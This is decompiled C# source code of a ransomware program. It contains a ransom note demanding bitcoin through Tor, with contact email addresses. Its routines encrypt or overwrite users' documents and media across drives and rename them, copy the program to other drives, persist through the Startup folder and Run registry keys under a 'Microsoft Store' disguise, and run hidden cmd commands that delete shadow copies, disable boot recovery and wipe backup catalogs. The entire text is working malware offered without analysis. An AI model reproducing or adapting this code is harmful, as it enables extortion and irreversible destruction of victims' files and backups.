	public static readonly Regex regex_0 = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] string_14 = new string[24]
	{
		"If you want to recover your files, follow these commands and purchase a recovery key.", "", "====================================================", "", "1. Please contact us by email below and send us your VH2S, which is your VICTOM number.", "", "2. If you have sent the correct VICTOM number via email, you will be sent a site where you can purchase the recovery key.", "", "3. Go to the www.torproject.org site and download the Tor browser.", "",
		"4. Please connect to the site and send 0.0035 bitcoin to the bitcoin wallet written on the site. If you don't have bitcoin, buy it with your credit card and send it.", "", "5. If the purchase is complete, download and run the recovery key. Your files will be restored if the program has run normally. If you run the program and nothing happens, please run the program again.", "", "", "==========EMAIL==========", "", "", "pentros30@protonmail.com", "",
		"pentaxyz777@protonmail.com", "", "gxa34rttf50gqlagnes@gmail.com", ""
	};

	private static string[] string_15 = new string[22]
	{
		".jpg", ".png", ".jpeg", ".bmp", ".raw", ".gif", ".mp3", ".mp4", ".mov", ".avi",
		".m4a", ".hwp", "ppt", ".pptx", ".doc", ".docx", ".xls", ".xlsx", ".zip", ".rar",
		".egg", ".url"
	};

	private static Random random_0 = new Random();

	[CompilerGenerated]
	private static ThreadStart threadStart_0;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_16, uint uint_2);

	private static void Main(string[] args)
	{
		if (smethod_2())
		{
			Environment.Exit(1);
		}
		if (bool_4)
		{
			smethod_1();
		}
		if (bool_5)
		{
			smethod_16(string_5);
		}
		else if (bool_2)
		{
			smethod_15(string_5);
		}
		if (bool_3)
		{
			smethod_17();
		}
		smethod_14();
		if (bool_5)
		{
			if (bool_6)
			{
				smethod_22();
			}
			if (bool_7)
			{
				smethod_23();
			}
			if (bool_8)
			{
				smethod_24();
			}
		}
		if (bool_1)
		{
			smethod_20(string_4);
		}
		smethod_18();
		smethod_25(string_7);
		new Thread((ThreadStart)delegate
		{
			smethod_0();
		}).Start();
	}

	public static void smethod_0()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void smethod_1()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(int_0 * 1000);
		}
	}

	private static bool smethod_2()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] smethod_3(int int_1)
	{
		Random random = new Random();
		int_1++;
		byte[] array = new byte[int_1];
		random.NextBytes(array);
		return array;
	}

	public static string smethod_4(int int_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_1; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random_0.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string smethod_5(int int_1)
	{
		if (string_3 == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < int_1; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random_0.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return string_3;
	}

	public static string smethod_6(string string_16)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_16);
		return Convert.ToBase64String(bytes);
	}

	public static string smethod_7(string string_16)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_16);
		return "<EncyptedKey>" + smethod_6(smethod_4(41)) + "<EncyptedKey> " + smethod_4(2) + Convert.ToBase64String(bytes);
	}

	private static void smethod_8(string string_16)
	{
		try
		{
			string[] files = Directory.GetFiles(string_16);
			bool flag = true;
			string string_17;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string_17 = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(string_15, (string string_1) => string_1 == string_17.ToLower()) || !(fileName != string_9))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (bool_0)
						{
							smethod_12(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int int_ = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(smethod_3(int_));
						File.WriteAllText(files[i], smethod_7(@string));
						File.Move(files[i], files[i] + "." + smethod_5(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(smethod_3(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], smethod_7(string2));
						File.Move(files[i], files[i] + "." + smethod_5(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(string_16 + "/" + string_9, string_14);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(string_16);
			for (int j = 0; j < directories.Length; j++)
			{
				smethod_8(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_9()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>pjUT7rTuaWbB5tMWuVIOICXEkiUPy+scWexRgVe6SmEkwlVVC5Qm13gCJxr1QRqxUvtfnRWV0/L7A05aF+9x7fhKdj+a9SpIpTdXJlxZROx8uYEKAY9SuU5kH9uadIRf9HRuE+sPzqQ+e//bVeBfINsxR1GOkMP3oFx6bgWsNyE=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string smethod_10(int int_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_1--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] smethod_11(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void smethod_12(string string_16)
	{
		byte[] byte_ = File.ReadAllBytes(string_16);
		string text = smethod_10(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = smethod_11(byte_, bytes);
		File.WriteAllText(string_16, "<EncryptedKey>" + smethod_13(text, smethod_9()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(string_16, string_16 + "." + smethod_5(4));
	}

	public static string smethod_13(string string_16, string string_17)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_16);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(string_17.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void smethod_14()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				smethod_8(driveInfo.ToString());
			}
		}
		string string_ = string_1 + string_0 + "\\Desktop";
		string string_2 = string_1 + string_0 + "\\Links";
		string string_3 = string_1 + string_0 + "\\Contacts";
		string string_4 = string_1 + string_0 + "\\Desktop";
		string string_5 = string_1 + string_0 + "\\Documents";
		string string_6 = string_1 + string_0 + "\\Downloads";
		string string_7 = string_1 + string_0 + "\\Pictures";
		string string_8 = string_1 + string_0 + "\\Music";
		string string_9 = string_1 + string_0 + "\\OneDrive";
		string string_10 = string_1 + string_0 + "\\Saved Games";
		string string_11 = string_1 + string_0 + "\\Favorites";
		string string_12 = string_1 + string_0 + "\\Searches";
		string string_13 = string_1 + string_0 + "\\Videos";
		smethod_8(string_);
		smethod_8(string_2);
		smethod_8(string_3);
		smethod_8(string_4);
		smethod_8(string_5);
		smethod_8(string_6);
		smethod_8(string_7);
		smethod_8(string_8);
		smethod_8(string_9);
		smethod_8(string_10);
		smethod_8(string_11);
		smethod_8(string_12);
		smethod_8(string_13);
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		smethod_8(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void smethod_15(string string_16)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + string_16;
		if (!(friendlyName != string_16) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void smethod_16(string string_16)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + string_16;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != string_16) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					smethod_16(string_16);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				smethod_16(string_16);
			}
		}
	}

	private static void smethod_17()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string processName = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + processName + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void smethod_18()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_9;
		try
		{
			File.WriteAllLines(text, string_14);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void smethod_19()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void smethod_20(string string_16)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + string_16))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + string_16);
				}
				catch
				{
				}
			}
		}
	}

	private static void smethod_21(string string_16)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + string_16;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void smethod_22()
	{
		smethod_21("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void smethod_23()
	{
		smethod_21("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void smethod_24()
	{
		smethod_21("wbadmin delete catalog -quiet");
	}

	public static void smethod_25(string string_16)
	{
		if (string_16 != "")
		{
			try
			{
				string text = Path.GetTempPath() + smethod_4(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(string_16));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private static void smethod_26()
	{
		smethod_0();
	}
}
